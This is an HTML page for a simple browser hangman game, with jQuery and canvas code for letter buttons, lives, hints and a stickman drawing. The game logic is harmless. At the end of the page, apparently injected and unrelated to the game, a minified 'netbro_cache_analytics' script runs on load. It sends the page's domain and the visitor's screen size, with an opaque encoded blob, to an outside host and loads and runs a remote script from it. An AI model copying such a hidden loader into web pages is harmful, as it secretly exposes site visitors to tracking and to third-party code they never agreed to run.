
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
    <title>Random Ass Hangman Game</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/ie10-viewport-bug-workaround.css" rel="stylesheet">
    <!--<link href="cover.css" rel="stylesheet"> -->
    <link href="cover2.css" rel="stylesheet">
	<script src="js/ie-emulation-modes-warning.js"></script>
	<script src="js/jquery-3.1.1.min.js" type="text/javascript"></script>
	<script type="text/javascript">
		$(document).ready(function() {
			$(".site-wrapper").fadeIn(1500).removeClass("hidden");
      $("html, body").animate({scrollTop: 135}, 1000);
		})
	</script>
  <script type="text/javascript">
    window.onload = function () {

      var alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
            'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's',
            't', 'u', 'v', 'w', 'x', 'y', 'z'];
      
      var categories;         // Array of topics
      var chosenCategory;     // Selected catagory
      var getHint ;          // Word getHint
      var word ;              // Selected word
      var guess ;             // Geuss
      var geusses = [ ];      // Stored geusses
      var lives ;             // Lives
      var counter ;           // Count correct geusses
      var space;              // Number of spaces in word '-'

      // Get elements
      var showLives = document.getElementById("mylives");
      var showCatagory = document.getElementById("scatagory");
      var getHint = document.getElementById("hint");
      var showClue = document.getElementById("clue");



      // create alphabet ul
      var buttons = function () {
        myButtons = document.getElementById('buttons');
        letters = document.createElement('ul');

        for (var i = 0; i < alphabet.length; i++) {
          letters.id = 'alphabet';
          list = document.createElement('li');
          list.id = 'letter';
          list.innerHTML = alphabet[i];
          check();
          myButtons.appendChild(letters);
          letters.appendChild(list);
        }
      }
        
      
      // Select Catagory
      var selectCat = function () {
        if (chosenCategory === categories[0]) {
          catagoryName.innerHTML = "Question 1";
        } else if (chosenCategory === categories[1]) {
          catagoryName.innerHTML = "Question 2";
        } else if (chosenCategory === categories[2]) {
          catagoryName.innerHTML = "Question 3";
        }
      }

      // Create geusses ul
       result = function () {
        wordHolder = document.getElementById('hold');
        correct = document.createElement('ul');

        for (var i = 0; i < word.length; i++) {
          correct.setAttribute('id', 'my-word');
          guess = document.createElement('li');
          guess.setAttribute('class', 'guess');
          if (word[i] === "-") {
            guess.innerHTML = "-";
            space = 1;
          } else {
            guess.innerHTML = "_";
          }

          geusses.push(guess);
          wordHolder.appendChild(correct);
          correct.appendChild(guess);
        }
      }
      
      // Show lives
       comments = function () {
        showLives.innerHTML = "You have " + lives + " lives";
        if (lives < 1) {
          showLives.innerHTML = "Game Over";
        }
        for (var i = 0; i < geusses.length; i++) {
          if (counter + space === geusses.length) {
            showLives.innerHTML = "You Win!";
          }
        }
      }

          // Animate man
      var animate = function () {
        var drawMe = lives ;
        drawArray[drawMe]();
      }

      
       // Hangman
      canvas =  function(){

        myStickman = document.getElementById("stickman");
        context = myStickman.getContext('2d');
        context.beginPath();
        context.strokeStyle = "#fff";
        context.lineWidth = 2;
      };
      
        head = function(){
          myStickman = document.getElementById("stickman");
          context = myStickman.getContext('2d');
          context.beginPath();
          context.arc(60, 25, 10, 0, Math.PI*2, true);
          context.stroke();
        }
        
      draw = function($pathFromx, $pathFromy, $pathTox, $pathToy) {
        
        context.moveTo($pathFromx, $pathFromy);
        context.lineTo($pathTox, $pathToy);
        context.stroke(); 
    }

       frame1 = function() {
         draw (0, 150, 150, 150);
         draw (10, 0, 10, 600);
         draw (0, 5, 70, 5);
         draw (60, 5, 60, 15);
       };
      
       torso = function() {
         draw (60, 36, 60, 70);
       };
      
       rightArm = function() {
         draw (60, 46, 100, 50);
       };
      
       leftArm = function() {
         draw (60, 46, 20, 50);
       };
      
       rightLeg = function() {
         draw (60, 70, 100, 100);
       };
      
       leftLeg = function() {
         draw (60, 70, 20, 100);
       };
      
      drawArray = [rightLeg, leftLeg, rightArm, leftArm,  torso,  head, frame1]; 


      // OnClick Function
       check = function () {
        list.onclick = function () {
          var geuss = (this.innerHTML);
          this.setAttribute("class", "active");
          this.onclick = null;
          for (var i = 0; i < word.length; i++) {
            if (word[i] === geuss) {
              geusses[i].innerHTML = geuss;
              counter += 1;
            } 
          }
          var j = (word.indexOf(geuss));
          if (j === -1) {
            lives -= 1;
            comments();
            animate();
          } else {
            comments();
          }
        }
      }
      
        
      // Play
      play = function () {
        categories = [
            ["njass"],
            ["njay"],
            ["ntap"]
        ];

        chosenCategory = categories[Math.floor(Math.random() * categories.length)];
        word = chosenCategory[Math.floor(Math.random() * chosenCategory.length)];
        word = word.replace(/\s/g, "-");
        console.log(word);
        buttons();

        geusses = [ ];
        lives = 7;
        counter = 0;
        space = 0;
        result();
        comments();
        selectCat();
        canvas();
      }

      play();
      
      // Hint

        hint.onclick = function() {

          hints = [
            ["Njass"],
            ["Njay"],
            ["Ntap"]
        ];

        var catagoryIndex = categories.indexOf(chosenCategory);
        var hintIndex = chosenCategory.indexOf(word);
        showClue.innerHTML = "Clue: - " +  hints [catagoryIndex][hintIndex];
      };

       // Reset

      document.getElementById('reset').onclick = function() {
        correct.parentNode.removeChild(correct);
        letters.parentNode.removeChild(letters);
        showClue.innerHTML = "";
        context.clearRect(0, 0, 400, 400);
        play();
      }
    }
  </script>
  </head>

  <body>

    <div class="site-wrapper hidden">

      <div class="site-wrapper-inner">

        <div class="cover-container">

          <div class="masthead clearfix">
            <div class="inner">
              <h3 class="masthead-brand">Hangman</h3>
              <nav>
                <ul class="nav masthead-nav">
                  <li class="active"><a href="index.php">Home</a></li>
                  <li><a href="#">About</a></li>
                  <li><a href="#">Contact</a></li>
                </ul>
              </nav>
            </div>
          </div>

          <div class="inner cover">
            <br>
            <br>
            <br>
            <div class="wrapper">
                <p>Use the alphabet below to guess the word, or click hint to get a clue. </p>
            </div>
            <div class="wrapper">
                <div id="buttons">
                </div>
                <br>
                <br>
                <br>
                <br>
                <br>
                <p id="catagoryName"></p>
                <div id="hold">
                </div>
                <p id="mylives"></p>
                <p id="clue">Clue -</p>  
                 <canvas id="stickman">This Text will show if the Browser does NOT support HTML5 Canvas tag</canvas>
                <div class="container">
                  <button id="hint">Hint</button>
                  <button id="reset">Play again</button>
                </div>
            </div>
          </div>

          <!-- <div class="mastfoot">
            <div class="inner">
              <p>Copyright by Fauzan Ardhana.</p>
            </div>
          </div> -->

        </div>

      </div>

    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>window.jQuery || document.write('<script src="../../assets/js/vendor/jquery.min.js"><\/script>')</script>
    <script src="../../dist/js/bootstrap.min.js"></script>
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BCExWkDbNJyThlSnwe2u2LmNHWGS%2feH%2f%2becw%2fY4hjyf%2brvAF5SauiRDNkYiqnMPsqP6JahM2zmJgBVxIUb%2f71gQNi2QborCAVC5Wrx25HVhOU1fLfiMAco65pgm%2bsI%2biN8Wii6dviv11EBj1c7lWwGsXX1lFVDQ5RztgI6DS9rCxeups2BLw%2fNUX5nn%2bBHT38MMP%2f7webQXnvq6%2ftwOwaugf6Nfnjkh9hz4HBaMQ6Pj8gDdahbARQyJei1kB%2b9jCP%2byE28zIfjozhZ57jBIoC5PNLaH%2boZH0riJop4IBoN49IxMQhj1O74crUWzBO5UT43hP5d5d0mWQQXGoZQfcRR%2f5EX81QwQfpVk02ai9l%2bk775D2dXAOp1UtMnveWq3RUQ76%2bn0amQmD8EcSkUkw5XDGfuS4rlpWJ2HPpIsTlBdEb8bXBLAWH0MkQP67jUpgDh7R6NYrusxE6D569lYqcBhSYK%2fSg69mVYmTgIm0dc2LywjvdkTt1Ys0HkzYRjV10XxP2XEVy%2bwM5EOjcRA%2bDIzZJU5jqlv2sLHy8muL5GxA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
